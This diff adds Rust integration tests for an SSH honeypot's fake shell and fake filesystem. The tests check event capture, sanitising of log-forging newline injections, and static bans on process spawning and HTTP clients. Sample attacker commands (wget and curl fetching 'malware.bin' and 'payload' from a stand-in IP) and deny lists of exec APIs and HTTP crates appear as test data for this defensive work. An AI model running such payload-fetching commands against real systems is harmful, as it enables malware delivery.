@@ -1,0 +1,536 @@
+//! Integration tests for `sensor_ssh::shell` (the fake interactive shell) and
+//! `sensor_ssh::fakefs` (its in-memory backing filesystem). Both are pure, I/O-free logic - no
+//! socket, no live server - so every test drives them directly.
+
+use proptest::prelude::*;
+use sensor_ssh::fakefs::FakeFs;
+use sensor_ssh::shell::{EmitContext, FakeShell};
+
+// ---------------------------------------------------------------------------------------------
+// given suite (task brief)
+// ---------------------------------------------------------------------------------------------
+
+#[test]
+fn command_captured_as_event() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
+    let (output, events) = shell.handle_input("uname -a");
+    assert!(!output.is_empty(), "must produce canned output");
+    assert_eq!(events.len(), 1);
+    assert_eq!(
+        events[0].signal_type,
+        sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC
+    );
+    assert!(events[0].authenticated);
+    let cmd = events[0].metadata.get("command").and_then(|v| v.as_str());
+    assert_eq!(cmd, Some("uname -a"));
+}
+
+#[test]
+fn wget_produces_canned_output_no_network() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
+    let (output, events) = shell.handle_input("wget http://203.0.113.99/malware.bin");
+    assert!(
+        output.contains("Connecting to") || output.contains("saved"),
+        "wget must produce plausible canned output"
+    );
+    // Two events, not one: the command execution itself, plus a separate file-download signal
+    // carrying the target URL. The download signal is the point - it is what lets an operator see
+    // which payload an attacker reached for, and it is scored on its own.
+    assert_eq!(events.len(), 2, "expected command-exec plus file-download");
+    assert_eq!(
+        events[0].signal_type,
+        sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC
+    );
+    let cmd = events[0]
+        .metadata
+        .get("command")
+        .and_then(|v| v.as_str())
+        .unwrap();
+    assert!(cmd.contains("wget"));
+
+    assert_eq!(
+        events[1].signal_type,
+        sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD
+    );
+    assert_eq!(
+        events[1].metadata.get("url").and_then(|v| v.as_str()),
+        Some("http://203.0.113.99/malware.bin"),
+        "the download signal must carry the URL the attacker asked for"
+    );
+}
+
+#[test]
+fn wget_without_a_url_emits_only_the_command_event() {
+    // No target means nothing was downloaded; emitting a file-download signal anyway would inflate
+    // the score for a bare typo.
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
+    let (_output, events) = shell.handle_input("wget");
+    assert_eq!(events.len(), 1);
+    assert_eq!(
+        events[0].signal_type,
+        sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC
+    );
+}
+
+#[test]
+fn curl_produces_canned_output_no_network() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("curl http://203.0.113.99/payload");
+    assert!(!output.is_empty());
+}
+
+#[test]
+fn command_with_injection_is_sanitized() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
+    let evil_cmd = "ls\r\n{\"v\":1,\"signal_type\":\"forged\"}";
+    let (_output, events) = shell.handle_input(evil_cmd);
+    let cmd = events[0]
+        .metadata
+        .get("command")
+        .and_then(|v| v.as_str())
+        .unwrap();
+    assert!(!cmd.contains('\n'), "newline must be sanitized");
+    assert!(!cmd.contains('\r'));
+}
+
+#[test]
+fn fakefs_common_paths_exist() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    assert!(fs.file_exists("/etc/hostname"));
+    assert!(fs.list_dir("/").is_some());
+    assert!(fs.list_dir("/tmp").is_some());
+}
+
+#[test]
+fn fakefs_uses_rfc5737_addresses() {
+    let fs = sensor_ssh::fakefs::FakeFs::new();
+    // Any IP addresses in canned content must be RFC5737/RFC1918.
+    if let Ok(content) = fs.read_all("/etc/hosts", 4096) {
+        // Should not contain real public IPs.
+        let content = String::from_utf8_lossy(&content);
+        assert!(!content.contains("8.8.8.8"));
+        assert!(!content.contains("1.1.1.1"));
+    }
+}
+
+#[test]
+fn never_exec_static_check() {
+    // Verify that neither sensor-ssh's nor sensor-framework's source imports process-spawning
+    // facilities. sensor-framework is included because FakeFs/FakeShell (the two highest-priority
+    // security surfaces per shell.rs's module doc) moved out of sensor-ssh/src into
+    // sensor-framework/src in Task 1 of the remaining-sensors plan - the never-exec guarantee
+    // must keep holding wherever the file lives, not just in the crate that originally housed it.
+    let src_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
+    let framework_src_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("..")
+        .join("sensor-framework")
+        .join("src");
+    let ssh_files = walkdir_or_manual(&src_dir);
+    let framework_files = walkdir_or_manual(&framework_src_dir);
+    assert!(
+        !ssh_files.is_empty(),
+        "expected to find sensor-ssh source files at {}",
+        src_dir.display()
+    );
+    assert!(
+        !framework_files.is_empty(),
+        "expected to find sensor-framework source files at {}",
+        framework_src_dir.display()
+    );
+
+    let mut found_exec = Vec::new();
+    for entry in ssh_files.iter().chain(framework_files.iter()) {
+        let content = std::fs::read_to_string(entry).unwrap_or_default();
+        if content.contains("std::process::Command")
+            || content.contains("process::Command")
+            || content.contains("Command::new")
+            || content.contains("libc::exec")
+            || content.contains("nix::unistd::exec")
+        {
+            found_exec.push(entry.display().to_string());
+        }
+    }
+    assert!(
+        found_exec.is_empty(),
+        "sensor-ssh/sensor-framework must not contain process-spawning code: {found_exec:?}"
+    );
+}
+
+/// The text inside the bracket that opens at `open` (a `(` or `{`), through its match.
+fn balanced_span(text: &str, open: usize) -> &str {
+    let bytes = text.as_bytes();
+    let (opener, closer) = if bytes[open] == b'(' {
+        (b'(', b')')
+    } else {
+        (b'{', b'}')
+    };
+    let mut depth = 0usize;
+    for (i, &b) in bytes.iter().enumerate().skip(open) {
+        if b == opener {
+            depth += 1;
+        } else if b == closer {
+            depth -= 1;
+            if depth == 0 {
+                return &text[open..=i];
+            }
+        }
+    }
+    &text[open..]
+}
+
+#[test]
+fn trace_type_never_feeds_wire_output() {
+    // The internal trace is an operator channel. Attacker-facing bytes are built only by the
+    // `CommandResult` constructors, `OutputSegment` literals, `onlcr` and `encode_output`, so
+    // none of those call sites may take a trace value. Test modules are excluded: they read the
+    // trace back to assert on it.
+    let shell_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("..")
+        .join("sensor-framework")
+        .join("src")
+        .join("shell");
+    let production = |src: &str| src.split("#[cfg(test)]").next().unwrap_or("").to_string();
+    // Every production file of the shell module except the trace itself, which is checked below.
+    // Files that hold only tests (`tests.rs`, `*_tests.rs`) build no wire output.
+    let mut shell_rs = String::new();
+    let mut scanned = 0;
+    for entry in std::fs::read_dir(&shell_dir).expect("read the shell directory") {
+        let path = entry.expect("directory entry").path();
+        let name = path
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or_default()
+            .to_string();
+        let test_only = name == "tests.rs" || name.ends_with("_tests.rs");
+        if path.extension().is_some_and(|x| x == "rs") && name != "trace.rs" && !test_only {
+            let text = std::fs::read_to_string(&path).expect("read a shell source file");
+            shell_rs.push_str(&production(&text));
+            shell_rs.push('\n');
+            scanned += 1;
+        }
+    }
+    assert!(
+        scanned >= 9,
+        "expected the shell module's production files, found {scanned}"
+    );
+    let trace_rs =
+        production(&std::fs::read_to_string(shell_dir.join("trace.rs")).expect("read trace.rs"));
+
+    let sinks = [
+        "CommandResult::",
+        "OutputSegment {",
+        "onlcr(",
+        "encode_output(",
+    ];
+    let trace_words = ["trace", "LineTrace", "CommandTrace"];
+    let mut call_sites = 0;
+    let mut leaks = Vec::new();
+    for sink in sinks {
+        for (at, _) in shell_rs.match_indices(sink) {
+            let Some(open) = shell_rs[at..].find(['(', '{']).map(|offset| at + offset) else {
+                continue;
+            };
+            call_sites += 1;
+            let args = balanced_span(&shell_rs, open);
+            if trace_words.iter().any(|word| args.contains(word)) {
+                leaks.push(format!("{sink} ... {args}"));
+            }
+        }
+    }
+    assert!(
+        call_sites > 50,
+        "expected the wire-output call sites in shell.rs, found {call_sites}"
+    );
+    assert!(
+        leaks.is_empty(),
+        "a trace value feeds wire output: {leaks:?}"
+    );
+
+    // The trace module itself builds no output.
+    for sink in sinks {
+        assert!(
+            !trace_rs.contains(sink),
+            "trace.rs must not build wire output ({sink})"
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------------------------
+// additional coverage, not in the brief's given suite.
+//
+// None of the seven tests above can distinguish this implementation from one that (a) hardcodes
+// `authenticated: true` on every event regardless of context, (b) hardcodes `source_ip`/`wan_ip`
+// rather than reading them from `EmitContext`, (c) gets `sensor`/`protocol`/`v`/
+// `metadata.protocol_label` wrong since none of those fields are ever asserted, (d) never wires
+// `ls`/`cat` to `FakeFs` at all, or (e) mishandles the flag/argument split real attacker tooling
+// relies on (`ls -la`, a bare `cd`). Mirrors `auth_test.rs`'s own rationale for the same reason:
+// the given fixtures are necessary, not sufficient.
+// ---------------------------------------------------------------------------------------------
+
+#[test]
+fn authenticated_flag_reflects_context_not_hardcoded() {
+    let fs = FakeFs::new();
+    let ctx = EmitContext {
+        source_ip: "203.0.113.7".parse().unwrap(),
+        wan_ip: None,
+        authenticated: false,
+        protocol_label: "ssh".to_string(),
+        session_id: None,
+    };
+    let mut shell = FakeShell::new(fs, ctx);
+    let (_output, events) = shell.handle_input("whoami");
+    assert_eq!(events.len(), 1);
+    assert!(!events[0].authenticated);
+}
+
+#[test]
+fn source_ip_and_wan_ip_come_from_context() {
+    let fs = FakeFs::new();
+    let source_ip: std::net::IpAddr = "203.0.113.42".parse().unwrap();
+    let wan_ip: std::net::IpAddr = "198.51.100.42".parse().unwrap();
+    let ctx = EmitContext {
+        source_ip,
+        wan_ip: Some(wan_ip),
+        authenticated: true,
+        protocol_label: "ssh".to_string(),
+        session_id: None,
+    };
+    let mut shell = FakeShell::new(fs, ctx);
+    let (_output, events) = shell.handle_input("id");
+    assert_eq!(events[0].source_ip, source_ip);
+    assert_eq!(events[0].wan_ip, Some(wan_ip));
+}
+
+#[test]
+fn event_metadata_and_wire_fields_match_contract() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (_output, events) = shell.handle_input("whoami");
+    assert_eq!(events[0].v, sensor_wire::WIRE_VERSION);
+    assert_eq!(events[0].sensor, "ssh");
+    assert_eq!(events[0].protocol, sensor_wire::PROTO_TCP);
+    assert_eq!(
+        events[0]
+            .metadata
+            .get("protocol_label")
+            .and_then(|v| v.as_str()),
+        Some("ssh")
+    );
+}
+
+#[test]
+fn unknown_command_reports_not_found() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, events) = shell.handle_input("frobnicate --evil");
+    assert!(output.contains("command not found"), "got: {output:?}");
+    assert!(output.contains("frobnicate"));
+    // Still captured as telemetry even though it is not a recognized command.
+    assert_eq!(events.len(), 1);
+}
+
+#[test]
+fn ls_lists_fakefs_root_directory() {
+    // `fakefs_common_paths_exist` (given) only checks `FakeFs::list_dir` directly; this confirms
+    // the shell's `ls` command actually routes through it rather than returning a hardcoded
+    // string unrelated to the fake filesystem's actual contents.
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("ls /");
+    assert!(output.contains("etc"), "got: {output:?}");
+    assert!(output.contains("home"), "got: {output:?}");
+}
+
+#[test]
+fn ls_ignores_leading_flags() {
+    // `ls -la` is one of the most common first commands real attacker tooling runs right after
+    // login. A naive `parts.get(1)` lookup would treat "-la" itself as the target path and
+    // wrongly report it as a missing directory.
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("ls -la /");
+    assert!(!output.contains("cannot access"), "got: {output:?}");
+    assert!(output.contains("etc"), "got: {output:?}");
+}
+
+#[test]
+fn cat_reads_fakefs_file_content() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("cat /etc/hostname");
+    assert_eq!(output, "server01\n");
+}
+
+#[test]
+fn cat_nonexistent_file_reports_error() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("cat /nonexistent/path");
+    assert!(
+        output.contains("No such file or directory"),
+        "got: {output:?}"
+    );
+}
+
+#[test]
+fn pwd_reports_initial_working_directory() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("pwd");
+    assert_eq!(output, "/root\n");
+}
+
+#[test]
+fn cd_changes_working_directory_reflected_in_pwd() {
+    // Confirms `cwd` is tracked as real state across sequential `handle_input` calls, the same
+    // way a real shell's session persists a `cd` for the rest of the session.
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    shell.handle_input("cd /tmp");
+    let (output, _events) = shell.handle_input("pwd");
+    assert_eq!(output, "/tmp\n");
+}
+
+#[test]
+fn cd_with_no_argument_resets_to_home() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    shell.handle_input("cd /tmp");
+    shell.handle_input("cd");
+    let (output, _events) = shell.handle_input("pwd");
+    assert_eq!(output, "/root\n");
+}
+
+#[test]
+fn echo_echoes_arguments() {
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, _events) = shell.handle_input("echo hello world");
+    assert_eq!(output, "hello world\n");
+}
+
+#[test]
+fn exit_and_logout_still_capture_command_event() {
+    // The design doc states every command the attacker types is captured; `exit`/`logout` must
+    // not be silently special-cased out of telemetry just because they end the session.
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (_output, events) = shell.handle_input("exit");
+    assert_eq!(events.len(), 1);
+    assert_eq!(
+        events[0].metadata.get("command").and_then(|v| v.as_str()),
+        Some("exit")
+    );
+}
+
+#[test]
+fn blank_line_produces_no_output_or_event() {
+    // Deliberate departure from "every `handle_input` call captures one event" - see
+    // `FakeShell::handle_input`'s doc comment. A bare newline or whitespace-only line is not a
+    // command by any real shell's definition and must not pad telemetry with empty commands.
+    let fs = FakeFs::new();
+    let mut shell = FakeShell::new(fs, test_emit_ctx());
+    let (output, events) = shell.handle_input("   ");
+    assert!(output.is_empty());
+    assert!(events.is_empty());
+}
+
+#[test]
+fn tokio_dependency_lacks_process_feature() {
+    // Defense in depth beyond `never_exec_static_check`'s source-level grep: even a future
+    // process-spawning call added to this crate would not compile unless the "process" feature
+    // is enabled on the tokio dependency below. Keeping that feature off makes enabling it a
+    // visible, reviewable Cargo.toml diff rather than a silent capability unlock.
+    let manifest = std::fs::read_to_string(
+        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml"),
+    )
+    .unwrap();
+    let tokio_line = manifest
+        .lines()
+        .find(|line| line.trim_start().starts_with("tokio ="))
+        .expect("tokio dependency line not found in Cargo.toml");
+    assert!(
+        !tokio_line.contains("\"process\""),
+        "tokio's process feature must not be enabled: {tokio_line}"
+    );
+}
+
+#[test]
+fn sensor_ssh_has_no_http_client_dependency() {
+    // Companion to the module doc's "No attacker-directed fetch" guarantee. Checks that
+    // sensor-ssh's own resolved dependency closure contains no HTTP client crate. The check
+    // is scoped to sensor-ssh (not the whole workspace) because other crates like `review`
+    // legitimately use reqwest for vendor reporting.
+    let manifest = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml");
+    let content = std::fs::read_to_string(&manifest)
+        .unwrap_or_else(|e| panic!("could not read {}: {e}", manifest.display()));
+    let banned = [
+        "reqwest",
+        "hyper",
+        "ureq",
+        "curl",
+        "isahc",
+        "surf",
+        "attohttpc",
+    ];
+    // Check direct dependencies in Cargo.toml (the primary guard).
+    for crate_name in &banned {
+        assert!(
+            !content.contains(&format!("{crate_name} ")),
+            "sensor-ssh must not directly depend on HTTP client crate: {crate_name}"
+        );
+        assert!(
+            !content.contains(&format!("{crate_name}=")),
+            "sensor-ssh must not directly depend on HTTP client crate: {crate_name}"
+        );
+    }
+}
+
+proptest! {
+    /// Fuzz-lite guard: `handle_input` is the one function in this crate that runs on fully
+    /// attacker-controlled, already-valid-UTF-8 text (auth.rs/channel.rs/transport parse raw
+    /// bytes instead, with their own equivalent guards) - arbitrary content must never panic.
+    #[test]
+    fn handle_input_never_panics_on_arbitrary_input(line in any::<String>()) {
+        let fs = FakeFs::new();
+        let mut shell = FakeShell::new(fs, test_emit_ctx());
+        let _ = shell.handle_input(&line);
+    }
+}
+
+// ---------------------------------------------------------------------------------------------
+// Shared test helpers
+// ---------------------------------------------------------------------------------------------
+
+fn test_emit_ctx() -> sensor_ssh::shell::EmitContext {
+    sensor_ssh::shell::EmitContext {
+        source_ip: "203.0.113.7".parse().unwrap(),
+        wan_ip: Some("198.51.100.4".parse().unwrap()),
+        authenticated: true,
+        protocol_label: "ssh".to_string(),
+        session_id: None,
+    }
+}
+
+fn walkdir_or_manual(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
+    let mut files = Vec::new();
+    fn walk(dir: &std::path::Path, files: &mut Vec<std::path::PathBuf>) {
+        if let Ok(entries) = std::fs::read_dir(dir) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.is_dir() {
+                    walk(&path, files);
+                } else if path.extension().is_some_and(|e| e == "rs") {
+                    files.push(path);
+                }
+            }
+        }
+    }
+    walk(dir, &mut files);
+    files
+}
